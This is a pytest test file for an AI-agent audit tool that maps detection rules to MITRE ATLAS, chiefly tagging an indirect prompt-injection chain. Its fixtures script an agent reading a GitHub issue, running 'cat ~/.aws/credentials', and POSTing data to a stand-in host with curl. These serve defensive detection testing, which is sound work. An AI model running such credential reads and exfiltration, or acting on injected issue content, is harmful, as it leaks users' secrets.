"""ATLAS on detections: the technique a whole sequence is evidence of.

ATT&CK describes what one tool call did. ATLAS at the detection level describes
the adversary technique the sequence is evidence of, which is a claim only a
rule is in a position to make.

The mapping is deliberately one rule wide. Of the fifteen built-in rules, one
describes an ATLAS technique; the rest are host and operations behaviour that
ATT&CK already covers, and labelling those would put an AI-threat technique on
a shell command. Most of this file exists to hold that line, because the
pressure on a taxonomy field is always to fill it in.

Ids resolved by name against ATLAS content release 2026.07, format-version
6.0.0, at dist/v6/ATLAS-2026.07.yaml. Resolving by name rather than by
recollection is what caught that AML.T0054 is LLM Jailbreak and not indirect
prompt injection, and that AML.T0099 is AI Agent Tool *Data* Poisoning rather
than AI Agent Tool Poisoning (AML.T0110).
"""

from __future__ import annotations

import pytest

from agentmetry.core.audit.atlas import (
    ATLAS_VERSION,
    AtlasMappingError,
    DETECTION_ATLAS,
    TECHNIQUE_ID_RE,
    atlas_for_rule,
    parse_yaml_atlas,
    register_yaml_atlas,
    reset_yaml_atlas,
)
from agentmetry.core.audit.canonical import SCHEMA_VERSION
from agentmetry.core.audit.detection.engine import run_detections
from agentmetry.core.audit.detection.live import build_detection_event
from agentmetry.core.audit.detection.models import Detection


@pytest.fixture(autouse=True)
def _clean_overlay():
    reset_yaml_atlas()
    yield
    reset_yaml_atlas()


def _event(seq: int, qualified: str, command: str, mitre: dict | None = None) -> dict:
    event: dict = {
        "schema_version": SCHEMA_VERSION,
        "event_id": f"e{seq}",
        "seq": seq,
        "correlation_id": "adi-1",
        "timestamp_utc": f"2026-08-21T09:0{seq}:00+00:00",
        "action": {"type": "tool_called", "outcome": "success"},
        "tool": {"qualified": qualified, "command": command},
    }
    if mitre:
        event["tool"]["mitre"] = mitre
    return event


def _adi_session() -> list[dict]:
    """The chain from arXiv:2607.05120, which the rule's docstring cites.

    Attacker-authorable content is pulled in (a GitHub issue), and the session
    then performs an already-risky action. Plain execution after ingestion is
    deliberately not enough, so the second call carries a credential-access
    mapping.
    """
    return [
        _event(1, "Bash", "gh issue view 42 --repo acme/widget"),
        _event(
            2,
            "Bash",
            "cat ~/.aws/credentials",
            {
                "tactic_id": "TA0006",
                "tactic": "Credential Access",
                "technique_id": "T1552.001",
                "technique": "Credentials In Files",
            },
        ),
    ]


def _fire(events: list[dict], rule_id: str) -> Detection:
    hits = [d for d in run_detections(events) if d.rule_id == rule_id]
    assert hits, f"expected {rule_id} to fire; got {[d.rule_id for d in run_detections(events)]}"
    return hits[0]


# ---------------------------------------------------------------------------
# The mapped rule
# ---------------------------------------------------------------------------


def test_the_adi_chain_fires_and_carries_indirect_prompt_injection():
    detection = _fire(_adi_session(), "untrusted-input-then-risky-action")
    event = build_detection_event(detection, _adi_session()[0])

    atlas = event["detection"]["atlas"]
    assert atlas["technique_id"] == "AML.T0051.001"
    assert atlas["technique"] == "LLM Prompt Injection: Indirect"
    assert atlas["tactic_id"] == "AML.TA0005"
    assert atlas["tactic"] == "Execution"
    assert atlas["framework"] == "MITRE ATLAS"


def test_the_version_travels_with_the_block():
    """An id without the matrix it came from is not re-resolvable later."""
    detection = _fire(_adi_session(), "untrusted-input-then-risky-action")
    event = build_detection_event(detection, _adi_session()[0])

    assert event["detection"]["atlas"]["atlas_version"] == ATLAS_VERSION
    assert ATLAS_VERSION == "2026.07"


def test_a_detection_carrying_atlas_is_schema_1_2_0():
    detection = _fire(_adi_session(), "untrusted-input-then-risky-action")
    event = build_detection_event(detection, _adi_session()[0])

    assert "atlas" in event["detection"]
    assert event["schema_version"] == "1.2.0"


def test_the_block_sits_beside_the_finding_not_at_the_top_level():
    """One placement rule across the schema: the label lives next to the thing
    it labels, matching tool.atlas and mcp_schema.atlas."""
    detection = _fire(_adi_session(), "untrusted-input-then-risky-action")
    event = build_detection_event(detection, _adi_session()[0])

    assert "atlas" in event["detection"]
    assert "atlas" not in event


# ---------------------------------------------------------------------------
# Everything else stays empty
# ---------------------------------------------------------------------------


def test_a_host_behaviour_rule_fires_with_no_atlas_key():
    """credential-exfil is real, serious, and not an ATLAS technique.

    Omitted rather than null: a null would make every consumer distinguish "no
    ATLAS meaning" from "not yet classified", and here those are the same.
    """
    events = [
        _event(
            1,
            "cursor.Read",
            "cat ~/.aws/credentials",
            {
                "tactic_id": "TA0006",
                "tactic": "Credential Access",
                "technique_id": "T1552.001",
                "technique": "Credentials In Files",
            },
        ),
        _event(
            2,
            "WebFetch",
            "curl -X POST https://example.com/collect",
            {
                "tactic_id": "TA0011",
                "tactic": "Command and Control",
                "technique_id": "T1071.001",
                "technique": "Web Protocols",
            },
        ),
    ]
    detection = _fire(events, "credential-exfil")
    event = build_detection_event(detection, events[0])

    assert "atlas" not in event["detection"]
    assert "atlas" not in event


@pytest.mark.parametrize(
    "rule_id",
    [
        "credential-exfil",
        "destructive-delete-burst",
        "session-tool-burst",
        "encoded-command-download",
        "remote-staging-then-execute",
        "dotfile-read-then-git-push",
        "discovery-then-collect",
        "off-hours-activity",
        "pr-merged-without-review",
        "subagent-swarm-burst",
        "approval-denied-then-executed",
        "autonomous-unapproved-write",
        "credential-read-then-cloud-api",
        "host-subagent-swarm-burst",
    ],
)
def test_no_other_built_in_rule_is_mapped(rule_id: str):
    assert atlas_for_rule(rule_id) is None
    event = build_detection_event(
        Detection(rule_id=rule_id, title="t", severity="high", summary="s", correlation_id="c"),
        {"schema_version": SCHEMA_VERSION},
    )
    assert "atlas" not in event["detection"]


def test_exactly_one_built_in_rule_is_mapped():
    """A guard on scope, not on correctness.

    Adding an entry should be a decision somebody makes on purpose, with an id
    resolved against the pinned release. If this number moves, the mapping
    grew, and this test is where that gets noticed.
    """
    assert set(DETECTION_ATLAS) == {"untrusted-input-then-risky-action"}


def test_an_unknown_rule_id_is_not_mapped():
    assert atlas_for_rule("some-rule-that-does-not-exist") is None
    assert atlas_for_rule("") is None


# ---------------------------------------------------------------------------
# Analyst overrides from the YAML manifest
# ---------------------------------------------------------------------------


def test_an_analyst_can_map_their_own_rule_without_editing_python():
    register_yaml_atlas(
        "rapid-dlp-blocks",
        parse_yaml_atlas(
            "rapid-dlp-blocks",
            {
                "tactic_id": "AML.TA0010",
                "tactic": "Exfiltration",
                "technique_id": "AML.T0086",
                "technique": "Exfiltration via AI Agent Tool Invocation",
            },
        ),
    )
    mapping = atlas_for_rule("rapid-dlp-blocks")
    assert mapping["technique_id"] == "AML.T0086"
    assert mapping["atlas_version"] == ATLAS_VERSION


def test_a_yaml_mapping_wins_over_the_built_in_one():
    """An operator editing their own manifest is making a deliberate statement.

    A shipped default that silently overrode it would make the override feature
    a lie.
    """
    register_yaml_atlas(
        "untrusted-input-then-risky-action",
        parse_yaml_atlas(
            "untrusted-input-then-risky-action",
            {"technique_id": "AML.T0051", "technique": "LLM Prompt Injection"},
        ),
    )
    assert atlas_for_rule("untrusted-input-then-risky-action")["technique_id"] == "AML.T0051"


def test_an_analyst_can_pin_their_own_atlas_release():
    mapping = parse_yaml_atlas(
        "r", {"technique_id": "AML.T0051", "atlas_version": "2025.11"}
    )
    assert mapping["atlas_version"] == "2025.11"


@pytest.mark.parametrize(
    "bad",
    [
        "T1552.001",  # ATT&CK, not ATLAS
        "AML.T51",  # too few digits
        "AML.T00511",  # too many
        "AML.TA0005",  # a tactic id in the technique field
        "aml.t0051",  # case matters
        "AML.T0051.1",  # sub-technique must be three digits
        "",
    ],
)
def test_a_malformed_technique_id_is_rejected_loudly(bad: str):
    """Raising beats dropping.

    A mapping silently discarded for a typo leaves the rule firing, the analyst
    believing it is tagged, and nothing saying otherwise until somebody queries
    for a technique id that was never emitted.
    """
    with pytest.raises(AtlasMappingError):
        parse_yaml_atlas("some-rule", {"technique_id": bad})


def test_a_malformed_tactic_id_is_rejected():
    with pytest.raises(AtlasMappingError):
        parse_yaml_atlas("r", {"technique_id": "AML.T0051", "tactic_id": "TA0005"})


def test_a_non_mapping_atlas_block_is_rejected():
    with pytest.raises(AtlasMappingError):
        parse_yaml_atlas("r", ["AML.T0051"])


def test_no_atlas_key_in_yaml_is_simply_no_mapping():
    assert parse_yaml_atlas("r", None) is None


def test_the_id_grammar_accepts_techniques_and_subtechniques():
    assert TECHNIQUE_ID_RE.match("AML.T0051")
    assert TECHNIQUE_ID_RE.match("AML.T0051.001")


# ---------------------------------------------------------------------------
# Backward compatibility
# ---------------------------------------------------------------------------


def test_a_1_1_0_source_event_still_produces_a_usable_detection():
    """The bump is additive, so an older event flowing in is not an error.

    The detection inherits the source event's version, which is the existing
    behaviour and is left alone: a 1.1.0 event that produced a finding did not
    retroactively become a 1.2.0 event.
    """
    events = _adi_session()
    for event in events:
        event["schema_version"] = "1.1.0"
    detection = _fire(events, "untrusted-input-then-risky-action")
    built = build_detection_event(detection, events[0])

    assert built["schema_version"] == "1.1.0"
    # The block is still attached: enrichment does not depend on the bump.
    assert built["detection"]["atlas"]["technique_id"] == "AML.T0051.001"
    # Every field a 1.1.0 consumer reads is still where it was.
    for key in ("event_id", "correlation_id", "timestamp_utc", "action", "detection"):
        assert key in built
